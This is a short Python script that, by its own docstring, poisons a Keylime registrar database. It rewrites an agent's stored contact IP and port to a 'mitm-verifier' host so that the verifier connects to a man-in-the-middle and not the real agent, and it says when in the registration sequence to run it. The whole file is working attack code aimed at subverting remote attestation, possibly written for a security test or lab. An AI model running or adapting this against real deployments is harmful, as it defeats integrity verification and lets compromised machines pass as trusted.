#!/usr/bin/env python3
"""
Poison the registrar database to make verifier connect to MITM instead of agent
Run this AFTER agent registration but BEFORE adding agent to verifier
"""

import os, sqlite3

DB_PATH = "/var/lib/keylime/reg_data.sqlite"
AGENT_ID = os.getenv("AGENT_ID", "d432fbb3-d2f1-4a97-9ef7-75bd81c00000")

conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

# Update agent's contact IP to point to MITM
cursor.execute("""
    UPDATE registrarmain
    SET ip = 'mitm-verifier', port = 9002
    WHERE agent_id = ?
""", (AGENT_ID,))

conn.commit()
print(f"Updated {cursor.rowcount} agent entries")
conn.close()